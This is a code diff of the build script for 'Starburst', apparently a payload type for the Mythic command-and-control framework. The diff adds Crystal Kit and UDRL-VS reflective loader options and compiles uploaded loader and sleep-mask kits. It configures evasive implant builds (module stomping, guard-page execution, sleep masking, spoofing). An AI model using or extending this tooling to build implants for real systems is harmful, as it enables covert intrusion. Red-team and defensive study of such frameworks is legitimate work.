@@ -98,7 +98,7 @@ class Starburst(PayloadType):
     name = "starburst"
     file_extension = "bin"
     author = "@Lavender-exe"
-    semver = "1.3.0"
+    semver = "1.3.5"
     supported_os = [ SupportedOS.Windows, SupportedOS.Linux ]
     wrapper = False
     wrapped_payloads = ["erebus_wrapper", "service_wrapper", "scarecrow_wrapper"]
@@ -140,35 +140,47 @@ class Starburst(PayloadType):
             name="loader_type",
             group_name="UDRL",
             parameter_type=BuildParameterType.ChooseOne,
-            choices=["default", "udrl", "custom"],
+            choices=["default", "crystal-kit", "udrl-vs"],
             default_value="default",
-            description="Loader type: default (uses alloc/exec settings below), udrl (reflective DLL loader), or custom (upload ZIP)",
+            description="Loader type: default (shellcode loader), crystal-kit (Crystal Palace UDRL), or udrl-vs (Stardust UDRL-VS kit)",
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
             ],
         ),
         BuildParameter(
-            name="custom_udrl",
+            name="custom_crystal_kit",
             group_name="UDRL",
             parameter_type=BuildParameterType.Boolean,
             default_value=False,
-            description="Use custom Crystal Palace UDRL instead of default loader",
+            description="Upload a custom Crystal Kit instead of using the built-in Crystal Palace UDRL",
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="elf"),
-                HideCondition(name="loader_type", operand=HideConditionOperand.NotEQ, value="custom"),
+                HideCondition(name="loader_type", operand=HideConditionOperand.NotEQ, value="crystal-kit"),
             ],
         ),
         BuildParameter(
-            name="udrl_file",
+            name="crystal_kit_file",
             group_name="UDRL",
             parameter_type=BuildParameterType.File,
-            description="Custom Crystal Palace UDRL: ZIP with Makefile + loader.spec + src/",
+            description="Custom Crystal Kit ZIP (Makefile + loader.spec + src/)",
             required=False,
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="elf"),
-                HideCondition(name="custom_udrl", operand=HideConditionOperand.EQ, value=False),
+                HideCondition(name="custom_crystal_kit", operand=HideConditionOperand.EQ, value=False),
+            ],
+        ),
+        BuildParameter(
+            name="udrl_vs_file",
+            group_name="UDRL",
+            parameter_type=BuildParameterType.File,
+            description="UDRL-VS kit ZIP (Stardust framework: loader/ + mask/ with Makefiles and sources)",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
+                HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="elf"),
+                HideCondition(name="loader_type", operand=HideConditionOperand.NotEQ, value="udrl-vs"),
             ],
         ),
         BuildParameter(
@@ -200,11 +212,12 @@ class Starburst(PayloadType):
             parameter_type=BuildParameterType.ChooseOne,
             choices=["ModuleStomp", "VirtualAlloc", "NtAllocateVirtualMemory", "MapViewOfSection"],
             default_value="ModuleStomp",
-            description="Memory allocation: ModuleStomp (file-backed, defeats shellcode_thread), VirtualAlloc, NtAllocate, or MapView",
+            description="Memory allocation: ModuleStomp, VirtualAlloc, NtAllocate, or MapView",
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="shellcode"),
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="elf"),
+                HideCondition(name="loader_type", operand=HideConditionOperand.EQ, value="udrl-vs"),
             ],
         ),
         BuildParameter(
@@ -213,12 +226,13 @@ class Starburst(PayloadType):
             parameter_type=BuildParameterType.ChooseOne,
             choices=["guardpage", "direct", "CreateThread", "callback", "fiber", "threadpool"],
             default_value="guardpage",
-            description="Local execution: guardpage (VEH streaming, defeats memory_signature YARA), direct, CreateThread, callback, fiber, or threadpool",
+            description="Local execution: guardpage, direct, CreateThread, callback, fiber, or threadpool",
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="shellcode"),
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="elf"),
                 HideCondition(name="injection_mode", operand=HideConditionOperand.NotEQ, value="local"),
+                HideCondition(name="loader_type", operand=HideConditionOperand.EQ, value="udrl-vs"),
             ],
         ),
         BuildParameter(
@@ -232,6 +246,7 @@ class Starburst(PayloadType):
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="bin"),
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="shellcode"),
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="elf"),
+                HideCondition(name="loader_type", operand=HideConditionOperand.EQ, value="udrl-vs"),
             ],
         ),
         BuildParameter(
@@ -245,6 +260,7 @@ class Starburst(PayloadType):
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="shellcode"),
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="elf"),
                 HideCondition(name="injection_mode", operand=HideConditionOperand.EQ, value="local"),
+                HideCondition(name="loader_type", operand=HideConditionOperand.EQ, value="udrl-vs"),
             ],
         ),
         BuildParameter(
@@ -258,6 +274,7 @@ class Starburst(PayloadType):
                 HideCondition(name="architecture", operand=HideConditionOperand.EQ, value="x86"),
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="elf"),
                 HideCondition(name="sleep_mask", operand=HideConditionOperand.EQ, value="sleepmask_vs"),
+                HideCondition(name="loader_type", operand=HideConditionOperand.EQ, value="udrl-vs"),
             ],
         ),
         BuildParameter(
@@ -280,16 +297,18 @@ class Starburst(PayloadType):
             description="Sleep mask type: XOR sensitive fields, full image XOR, heap masking, Ekko timer-queue ROP (x64), UDRL, Sleepmask-VS, or custom",
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.EQ, value="elf"),
+                HideCondition(name="loader_type", operand=HideConditionOperand.EQ, value="udrl-vs"),
             ],
         ),
         BuildParameter(
             name="sleepmask_vs_file",
             group_name="Evasion",
             parameter_type=BuildParameterType.File,
-            description="Sleepmask-VS ZIP: contains sleepmask-vs/ sources and BOF-Template/ headers. Compiled automatically at build time.",
+            description="Sleepmask-VS ZIP: contains sleepmask-vs/ sources and BOF-Template/ headers.",
             required=False,
             hide_conditions=[
                 HideCondition(name="sleep_mask", operand=HideConditionOperand.NotEQ, value="sleepmask_vs"),
+                HideCondition(name="loader_type", operand=HideConditionOperand.EQ, value="udrl-vs"),
             ],
         ),
         BuildParameter(
@@ -297,9 +316,10 @@ class Starburst(PayloadType):
             group_name="Evasion",
             parameter_type=BuildParameterType.Boolean,
             default_value=False,
-            description="Enable Sleepmask-VS debug logging via OutputDebugStringA (visible in DbgView/WinDbg)",
+            description="Enable Sleepmask-VS debug logging via OutputDebugStringA (visible in DbgView/WinDbg) - will crash non-debugged processes if selected",
             hide_conditions=[
                 HideCondition(name="sleep_mask", operand=HideConditionOperand.NotEQ, value="sleepmask_vs"),
+                HideCondition(name="loader_type", operand=HideConditionOperand.EQ, value="udrl-vs"),
             ],
         ),
         BuildParameter(
@@ -444,9 +464,18 @@ class Starburst(PayloadType):
                 mask = self.get_parameter("sleep_mask")
             except Exception:
                 mask = "default"
+            try:
+                lt = self.get_parameter("loader_type")
+            except Exception:
+                lt = "default"
+            if lt == "udrl-vs":
+                mask = "sleepmask_vs"
             if mask == "sleepmask_vs":
                 sm_data_path = os.path.join(dst_path, "include", "evasion", "sleepmask_vs_data.h")
-                sm_coff = await self._compile_sleepmask_vs(agent_build_path, arch)
+                if lt == "udrl-vs":
+                    sm_coff = await self._compile_udrl_vs_mask(agent_build_path, arch)
+                else:
+                    sm_coff = await self._compile_sleepmask_vs(agent_build_path, arch)
                 if sm_coff:
                     with open(sm_coff, "rb") as f:
                         sm_bytes = f.read()
@@ -928,6 +957,13 @@ class Starburst(PayloadType):
         # build engine defines from build parameters
         engine_defines = self._build_engine_defines()
 
+        await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+            PayloadUUID=self.uuid,
+            StepName="Engine Defines",
+            StepStdout=f"loader_type={self.get_parameter('loader_type') if hasattr(self, 'get_parameter') else 'UNKNOWN'}\nDefines:\n{engine_defines}",
+            StepSuccess=True,
+        ))
+
         sc_array = ", ".join(f"0x{b:02x}" for b in shellcode)
         sc_len = len(shellcode)
 
@@ -989,6 +1025,18 @@ class Starburst(PayloadType):
     def _build_engine_defines(self):
         defines = []
 
+        try:
+            loader_type = self.get_parameter("loader_type")
+        except Exception:
+            loader_type = "default"
+
+        if loader_type == "udrl-vs":
+            defines.append("#define ALLOC_VIRTUALALLOC")
+            defines.append("#define EXEC_DIRECT")
+            if hasattr(self, '_udrl_vs_loader_size'):
+                defines.append(f"#define UDRL_LOADER_OFFSET {self._udrl_vs_loader_size}")
+            return "\n".join(defines)
+
         alloc = self.get_parameter("alloc_method")
         if alloc == "ModuleStomp":
             defines.append("#define ALLOC_MODULESTOMP")
@@ -1035,6 +1083,12 @@ class Starburst(PayloadType):
             mask_type = self.get_parameter("sleep_mask")
         except Exception:
             mask_type = "default"
+        try:
+            loader_type = self.get_parameter("loader_type")
+        except Exception:
+            loader_type = "default"
+        if loader_type == "udrl-vs":
+            spoof = "off"
         if mask_type == "sleepmask_vs":
             spoof = "off"
         if spoof and spoof != "off":
@@ -1065,6 +1119,8 @@ class Starburst(PayloadType):
             mask = self.get_parameter("sleep_mask")
         except Exception:
             mask = "default"
+        if loader_type == "udrl-vs":
+            mask = "sleepmask_vs"
         mask_map = {
             "default": "MASK_DEFAULT",
             "full_image": "MASK_FULL_IMAGE",
@@ -1109,7 +1165,7 @@ class Starburst(PayloadType):
             return self._find_sleepmask_vs_coff(arch)
 
         sm_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
-            AgentFileId=sm_file_id,
+            AgentFileID=sm_file_id,
         ))
         if not sm_resp.Success:
             logger.error(f"Failed to fetch sleepmask-vs ZIP: {sm_resp.Error}")
@@ -1194,6 +1250,85 @@ class Starburst(PayloadType):
 
         logger.info(f"Sleepmask-VS compiled successfully: {os.path.getsize(output_o)} bytes")
         return output_o
+
+    async def _ensure_udrl_vs_extracted(self, build_path):
+        """Extract the UDRL-VS kit ZIP if not already extracted. Returns kit_dir."""
+        kit_dir = os.path.join(build_path, "udrl_vs")
+        os.makedirs(kit_dir, exist_ok=True)
+
+        if os.path.isdir(os.path.join(kit_dir, "loader")) or os.path.isdir(os.path.join(kit_dir, "mask")):
+            return kit_dir
+
+        local_override = "/Mythic/loaders/udrl-vs-override.zip"
+        if os.path.isfile(local_override):
+            logger.info(f"Using local UDRL-VS override ZIP: {local_override}")
+            with zipfile.ZipFile(local_override, 'r') as z:
+                z.extractall(kit_dir)
+            return kit_dir
+
+        vs_file_id = self.get_parameter("udrl_vs_file")
+        if not vs_file_id:
+            logger.error("UDRL-VS requires an uploaded kit ZIP")
+            return None
+
+        vs_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
+            AgentFileID=vs_file_id,
+        ))
+        if not vs_resp.Success:
+            logger.error(f"Failed to fetch UDRL-VS kit: {vs_resp.Error}")
+            return None
+
+        import io
+        zip_buf = io.BytesIO(vs_resp.Content)
+        with zipfile.ZipFile(zip_buf, 'r') as z:
+            z.extractall(kit_dir)
+
+        return kit_dir
+
+    async def _compile_udrl_vs_mask(self, build_path, arch):
+        """Compile the sleepmask from a UDRL-VS kit's mask/ directory."""
+        kit_dir = await self._ensure_udrl_vs_extracted(build_path)
+        if not kit_dir:
+            return None
+        mask_dir = None
+        for candidate in [os.path.join(kit_dir, "mask"), kit_dir]:
+            makefile = os.path.join(candidate, "Makefile")
+            if not os.path.isfile(makefile):
+                makefile = os.path.join(candidate, "makefile")
+            if os.path.isfile(makefile):
+                with open(makefile, "r", errors="replace") as fh:
+                    if "sleepmask" in fh.read().lower():
+                        mask_dir = candidate
+                        break
+
+        if not mask_dir:
+            logger.error("No mask/ directory with Makefile found in UDRL-VS kit")
+            return None
+
+        os.makedirs(os.path.join(mask_dir, "dist"), exist_ok=True)
+
+        make_proc = await asyncio.create_subprocess_exec(
+            "make", "clean", "all",
+            cwd=mask_dir, env=_make_env(),
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
+        make_stdout, make_stderr = await _run_with_timeout(
+            make_proc, 60, "UDRL-VS mask compile")
+        if make_proc.returncode != 0:
+            logger.error(f"UDRL-VS mask compile failed: {make_stderr.decode(errors='replace')}")
+            return None
+
+        ext = f".{arch}.o"
+        for root, dirs, files in os.walk(mask_dir):
+            for f in files:
+                if f.endswith(ext):
+                    coff_path = os.path.join(root, f)
+                    logger.info(f"UDRL-VS mask compiled: {os.path.getsize(coff_path)} bytes")
+                    return coff_path
+
+        logger.error(f"UDRL-VS mask compile produced no {ext} output")
+        return None
 
     def _find_sleepmask_vs_coff(self, arch):
         """Locate a pre-compiled sleepmask-vs .o file on disk (any name)."""
@@ -1295,63 +1430,124 @@ class Starburst(PayloadType):
             loader_type = self.get_parameter("loader_type") or "default"
         except Exception:
             loader_type = "default"
-        try:
-            use_custom = self.get_parameter("custom_udrl") and loader_type == "custom"
-        except Exception:
-            use_custom = False
-        use_udrl = loader_type == "udrl"
 
-        if use_custom:
-            udrl_dir = os.path.join(build_path, "custom_udrl")
-            os.makedirs(udrl_dir, exist_ok=True)
+        if loader_type == "crystal-kit":
+            try:
+                use_custom_kit = self.get_parameter("custom_crystal_kit")
+            except Exception:
+                use_custom_kit = False
 
-            udrl_file_id = self.get_parameter("udrl_file")
-            udrl_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
-                AgentFileId=udrl_file_id,
-            ))
-            if not udrl_resp.Success:
-                logger.error(f"Failed to fetch custom UDRL: {udrl_resp.Error}")
+            if use_custom_kit:
+                kit_dir = os.path.join(build_path, "crystal_kit")
+                os.makedirs(kit_dir, exist_ok=True)
+
+                kit_file_id = self.get_parameter("crystal_kit_file")
+                kit_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
+                    AgentFileID=kit_file_id,
+                ))
+                if not kit_resp.Success:
+                    logger.error(f"Failed to fetch Crystal Kit: {kit_resp.Error}")
+                    return None
+
+                import io
+                zip_buf = io.BytesIO(kit_resp.Content)
+                with zipfile.ZipFile(zip_buf, 'r') as z:
+                    z.extractall(kit_dir)
+
+                make_dir = _find_make_dir(kit_dir)
+                make_proc = await asyncio.create_subprocess_exec(
+                    "make", arch,
+                    cwd=make_dir, env=_make_env(),
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+                make_stdout, make_stderr = await _run_with_timeout(
+                    make_proc, 60, "Crystal Kit compile")
+                if make_proc.returncode != 0:
+                    logger.error(f"Crystal Kit compile failed: {make_stderr.decode()}")
+                    return None
+
+                loader_path = _find_spec_dir(kit_dir, role="loader")
+                if not loader_path:
+                    logger.error("No loader.spec found in Crystal Kit archive")
+                    return None
+                logger.info("Custom Crystal Kit compiled successfully")
+            else:
+                loader_path = os.path.join(cp_path, "udrl")
+                if not os.path.exists(os.path.join(loader_path, "loader.spec")):
+                    logger.error("Built-in Crystal Palace UDRL not found at loaders/crystal-palace/udrl/")
+                    return None
+                make_proc = await asyncio.create_subprocess_exec(
+                    "make", "clean", "all",
+                    cwd=loader_path, env=_make_env(),
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+                make_stdout, make_stderr = await _run_with_timeout(
+                    make_proc, 60, "Crystal Palace UDRL compile")
+                if make_proc.returncode != 0:
+                    logger.error(f"Crystal Palace UDRL compile failed: {make_stderr.decode(errors='replace')}")
+                    return None
+                logger.info("Built-in Crystal Palace UDRL compiled successfully")
+
+        elif loader_type == "udrl-vs":
+            kit_dir = await self._ensure_udrl_vs_extracted(build_path)
+            if not kit_dir:
                 return None
 
-            import io
-            zip_buf = io.BytesIO(udrl_resp.Content)
-            with zipfile.ZipFile(zip_buf, 'r') as z:
-                z.extractall(udrl_dir)
+            loader_dir = os.path.join(kit_dir, "loader")
+            if not os.path.isdir(loader_dir):
+                for entry in os.listdir(kit_dir):
+                    candidate = os.path.join(kit_dir, entry, "loader")
+                    if os.path.isdir(candidate):
+                        loader_dir = candidate
+                        break
 
-            make_dir = _find_make_dir(udrl_dir)
+            if not os.path.isdir(loader_dir):
+                logger.error("No loader/ directory found in UDRL-VS kit")
+                return None
+
+            os.makedirs(os.path.join(loader_dir, "bin", "obj"), exist_ok=True)
             make_proc = await asyncio.create_subprocess_exec(
                 "make", arch,
-                cwd=make_dir, env=_make_env(),
+                cwd=loader_dir, env=_make_env(),
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
             )
             make_stdout, make_stderr = await _run_with_timeout(
-                make_proc, 60, "custom UDRL compile")
+                make_proc, 60, "UDRL-VS loader compile")
             if make_proc.returncode != 0:
-                logger.error(f"Custom UDRL compile failed: {make_stderr.decode()}")
+                logger.error(f"UDRL-VS loader compile failed: {make_stderr.decode()}")
                 return None
 
-            loader_path = _find_spec_dir(udrl_dir, role="loader")
-            if not loader_path:
-                logger.error(f"No loader.spec found in custom UDRL archive")
+            loader_bin = None
+            bin_dir = os.path.join(loader_dir, "bin")
+            for f in os.listdir(bin_dir):
+                if f.endswith(f".{arch}.bin"):
+                    loader_bin = os.path.join(bin_dir, f)
+                    break
+            if not loader_bin:
+                logger.error(f"UDRL-VS produced no .{arch}.bin in loader/bin/")
                 return None
-        elif use_udrl:
-            loader_path = os.path.join(cp_path, "udrl")
-            if not os.path.exists(os.path.join(loader_path, "loader.spec")):
-                logger.error("Built-in UDRL loader not found at loaders/crystal-palace/udrl/")
+
+            with open(loader_bin, "rb") as f:
+                loader_sc = f.read()
+
+            self._udrl_vs_loader_size = len(loader_sc)
+
+            try:
+                dll_path = await _wrap_shellcode_in_dll(shellcode, arch, build_path)
+            except RuntimeError as e:
+                logger.error(f"DLL stub wrapping failed: {e}")
                 return None
-            make_proc = await asyncio.create_subprocess_exec(
-                "make", "clean", "all",
-                cwd=loader_path, env=_make_env(),
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-            )
-            make_stdout, make_stderr = await _run_with_timeout(
-                make_proc, 60, "UDRL loader compile")
-            if make_proc.returncode != 0:
-                logger.error(f"UDRL loader compile failed: {make_stderr.decode(errors='replace')}")
-                return None
-            logger.info("Built-in UDRL reflective loader compiled successfully")
+
+            with open(dll_path, "rb") as f:
+                dll_bytes = f.read()
+
+            result = loader_sc + struct.pack("<I", len(dll_bytes)) + dll_bytes
+            logger.info(f"UDRL-VS linked: {len(loader_sc)} loader + {len(dll_bytes)} DLL = {len(result)} bytes")
+            return result
+
         else:
             loader_path = os.path.join(cp_path, "default")
             make_proc = await asyncio.create_subprocess_exec(
@@ -1374,7 +1570,7 @@ class Starburst(PayloadType):
             logger.error(f"loader.spec not found at {spec_file}")
             return None
 
-        if use_custom or use_udrl:
+        if loader_type == "crystal-kit":
             try:
                 dll_path = await _wrap_shellcode_in_dll(shellcode, arch, build_path)
             except RuntimeError as e:
@@ -1432,7 +1628,7 @@ class Starburst(PayloadType):
             return
 
         postex_resp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
-            AgentFileId=postex_file_id,
+            AgentFileID=postex_file_id,
         ))
         if not postex_resp.Success:
             raise RuntimeError(f"Failed to fetch post-ex UDRL: {postex_resp.Error}")
